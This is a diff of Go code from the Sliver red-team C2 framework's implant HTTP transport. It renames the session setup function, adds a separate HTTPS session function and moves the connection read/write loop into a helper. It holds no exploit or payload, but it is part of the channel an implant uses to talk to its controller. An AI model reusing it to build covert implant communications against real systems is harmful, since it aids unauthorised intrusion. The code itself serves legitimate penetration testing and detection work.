@@ -20,7 +20,9 @@ package httpclient
 
 import (
 	// {{if .Config.Debug}}
+
 	"log"
+
 	// {{end}}
 
 	"net"
@@ -30,26 +32,59 @@ import (
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
-// SetupConnectionHTTP - Wraps an HTTP client session into a logical Connection stream
-func SetupConnectionHTTP(c2URI *url.URL, c2 *sliverpb.C2Profile, userCleanup func() error) (*transports.Connection, error) {
+// NewSessionHTTP - Wraps an HTTP client session into a logical Connection stream
+func NewSessionHTTP(c2URI *url.URL, c2 *sliverpb.C2Profile, connection *transports.Connection) error {
 
 	// {{if .Config.Debug}}
-	log.Printf("Connecting -> http(s)://%s", c2URI.Host)
+	log.Printf("Connecting -> http://%s", c2URI.Host)
 	// {{end}}
 
-	client, err := HTTPStartSession(c2URI, c2)
+	client, err := StartSessionHTTP(c2URI, c2)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("http(s) connection error %v", err)
 		// {{end}}
-		return nil, err
+		return err
 	}
 	c2.ProxyURL = client.ProxyURL
 
 	// Create a new Session-level connection and register cleaning the HTTP client
 	// This will thus make both Session & Beacon C2 modes to work the same way.
-	connection := transports.NewConnection()
-	connection.Cleanup = client.Close
+	connection.Cleanup = client.CloseSession
+
+	// Handle read/write operations in the background, throwing errors if any
+	handleConnectionHTTP(c2, client, connection)
+
+	return nil
+}
+
+// NewSessionHTTPS - Creates a new Mutually authenticated HTTPS (or HTTPS unsecured/let's encrypt) session
+func NewSessionHTTPS(c2URI *url.URL, c2 *sliverpb.C2Profile, connection *transports.Connection) error {
+	// {{if .Config.Debug}}
+	log.Printf("Connecting -> http://%s", c2URI.Host)
+	// {{end}}
+
+	client, err := StartSessionHTTPS(c2URI, c2)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("http(s) connection error %v", err)
+		// {{end}}
+		return err
+	}
+	c2.ProxyURL = client.ProxyURL
+
+	// Register cleaning the HTTP client
+	// This will thus make both Session & Beacon C2 modes to work the same way.
+	connection.Cleanup = client.CloseSession
+
+	// Handle read/write operations in the background, throwing errors if any
+	handleConnectionHTTP(c2, client, connection)
+
+	return nil
+}
+
+// handleConnectionHTTP - Concurrently read and write envelopes coming from / going to the server through the HTTP client.
+func handleConnectionHTTP(c2 *sliverpb.C2Profile, client *SliverHTTPClient, connection *transports.Connection) {
 
 	go func() {
 		defer connection.Close()
@@ -109,5 +144,4 @@ func SetupConnectionHTTP(c2URI *url.URL, c2 *sliverpb.C2Profile, userCleanup fun
 		}
 	}()
 
-	return connection, nil
 }
